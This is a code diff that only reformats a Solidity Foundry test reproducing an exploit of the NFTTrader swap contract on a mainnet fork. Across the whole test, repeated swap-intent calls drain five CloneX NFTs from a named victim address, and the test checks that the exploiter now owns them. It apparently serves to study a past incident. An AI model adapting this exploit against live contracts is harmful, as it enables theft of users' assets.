@@ -32,24 +32,11 @@ interface IUniV3PosNFT {
 
     function setApprovalForAll(address operator, bool approved) external;
 
-    function safeTransferFrom(
-        address from,
-        address to,
-        uint256 tokenId,
-        bytes memory _data
-    ) external;
+    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory _data) external;
 
     function mint(
         MintParams memory params
-    )
-        external
-        payable
-        returns (
-            uint256 tokenId,
-            uint128 liquidity,
-            uint256 amount0,
-            uint256 amount1
-        );
+    ) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
 }
 
 interface INFTTrader {
@@ -73,10 +60,7 @@ interface INFTTrader {
         bytes data;
     }
 
-    function closeSwapIntent(
-        address _swapCreator,
-        uint256 _swapId
-    ) external payable;
+    function closeSwapIntent(address _swapCreator, uint256 _swapId) external payable;
 
     function createSwapIntent(
         swapIntent memory _swapIntent,
@@ -88,24 +72,17 @@ interface INFTTrader {
 }
 
 contract ContractTest is Test {
-    IUSDC private constant USDC =
-        IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    IWETH private constant WETH =
-        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
-    IUniV3PosNFT private constant UniV3PosNFT =
-        IUniV3PosNFT(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
-    INFTTrader private constant NFTTrader =
-        INFTTrader(0xC310e760778ECBca4C65B6C559874757A4c4Ece0);
-    IERC721 private constant CloneX =
-        IERC721(0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B);
-    address private constant victim =
-        0x23938954BC875bb8309AEF15e2Dead54884B73Db;
-    address private constant tradeSquad =
-        0x58874d2951524F7f851bbBE240f0C3cF0b992d79;
+    IUSDC private constant USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    IUniV3PosNFT private constant UniV3PosNFT = IUniV3PosNFT(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
+    INFTTrader private constant NFTTrader = INFTTrader(0xC310e760778ECBca4C65B6C559874757A4c4Ece0);
+    IERC721 private constant CloneX = IERC721(0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B);
+    address private constant victim = 0x23938954BC875bb8309AEF15e2Dead54884B73Db;
+    address private constant tradeSquad = 0x58874d2951524F7f851bbBE240f0C3cF0b992d79;
     uint256 private swapId;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 18799414);
+        vm.createSelectFork("mainnet", 18_799_414);
         vm.label(address(UniV3PosNFT), "UniV3PosNFT");
         vm.label(address(USDC), "USDC");
         vm.label(address(WETH), "WETH");
@@ -132,36 +109,26 @@ contract ContractTest is Test {
             deadline: block.timestamp
         });
 
-        (uint256 positionId, , , ) = UniV3PosNFT.mint{
-            value: address(this).balance
-        }(params);
+        (uint256 positionId,,,) = UniV3PosNFT.mint{value: address(this).balance}(params);
 
-        vm.roll(18799435);
+        vm.roll(18_799_435);
         deal(address(this), 0.1 ether);
         UniV3PosNFT.setApprovalForAll(address(CloneX), true);
 
-        vm.roll(18799487);
+        vm.roll(18_799_487);
         UniV3PosNFT.setApprovalForAll(address(NFTTrader), true);
         require(CloneX.isApprovedForAll(victim, address(NFTTrader)));
 
-        emit log_named_uint(
-            "Victim CloneX balance before attack",
-            CloneX.balanceOf(victim)
-        );
+        emit log_named_uint("Victim CloneX balance before attack", CloneX.balanceOf(victim));
 
-        emit log_named_uint(
-            "Exploiter CloneX balance before attack",
-            CloneX.balanceOf(address(this))
-        );
+        emit log_named_uint("Exploiter CloneX balance before attack", CloneX.balanceOf(address(this)));
 
-        uint256[] memory victimsCloneXTokenIds = new uint256[](
-            CloneX.balanceOf(victim)
-        );
-        victimsCloneXTokenIds[0] = 6_670;
-        victimsCloneXTokenIds[1] = 6_650;
-        victimsCloneXTokenIds[2] = 4_843;
-        victimsCloneXTokenIds[3] = 5_432;
-        victimsCloneXTokenIds[4] = 9_870;
+        uint256[] memory victimsCloneXTokenIds = new uint256[](CloneX.balanceOf(victim));
+        victimsCloneXTokenIds[0] = 6670;
+        victimsCloneXTokenIds[1] = 6650;
+        victimsCloneXTokenIds[2] = 4843;
+        victimsCloneXTokenIds[3] = 5432;
+        victimsCloneXTokenIds[4] = 9870;
 
         for (uint8 i; i < victimsCloneXTokenIds.length; ++i) {
             INFTTrader.swapIntent memory _swapIntent = INFTTrader.swapIntent({
@@ -176,10 +143,8 @@ contract ContractTest is Test {
                 status: 0
             });
 
-            INFTTrader.swapStruct[]
-                memory _nftsOne = new INFTTrader.swapStruct[](0);
-            INFTTrader.swapStruct[]
-                memory _nftsTwo = new INFTTrader.swapStruct[](2);
+            INFTTrader.swapStruct[] memory _nftsOne = new INFTTrader.swapStruct[](0);
+            INFTTrader.swapStruct[] memory _nftsTwo = new INFTTrader.swapStruct[](2);
             uint256[] memory _tokenId1 = new uint256[](1);
             _tokenId1[0] = positionId;
             uint256[] memory _blc = new uint256[](0);
@@ -201,32 +166,19 @@ contract ContractTest is Test {
                 data: ""
             });
             vm.recordLogs();
-            NFTTrader.createSwapIntent{value: 0.005 ether}(
-                _swapIntent,
-                _nftsOne,
-                _nftsTwo
-            );
+            NFTTrader.createSwapIntent{value: 0.005 ether}(_swapIntent, _nftsOne, _nftsTwo);
             Vm.Log[] memory entries = vm.getRecordedLogs();
-            (swapId, ) = abi.decode(entries[0].data, (uint256, address));
-            NFTTrader.closeSwapIntent{value: 0.005 ether}(
-                address(this),
-                swapId
-            );
+            (swapId,) = abi.decode(entries[0].data, (uint256, address));
+            NFTTrader.closeSwapIntent{value: 0.005 ether}(address(this), swapId);
         }
 
         for (uint8 j; j < victimsCloneXTokenIds.length; ++j) {
             assertEq(CloneX.ownerOf(victimsCloneXTokenIds[j]), address(this));
         }
 
-        emit log_named_uint(
-            "Victim CloneX balance after attack",
-            CloneX.balanceOf(victim)
-        );
+        emit log_named_uint("Victim CloneX balance after attack", CloneX.balanceOf(victim));
 
-        emit log_named_uint(
-            "Exploiter CloneX balance after attack",
-            CloneX.balanceOf(address(this))
-        );
+        emit log_named_uint("Exploiter CloneX balance after attack", CloneX.balanceOf(address(this)));
     }
 
     function onERC721Received(
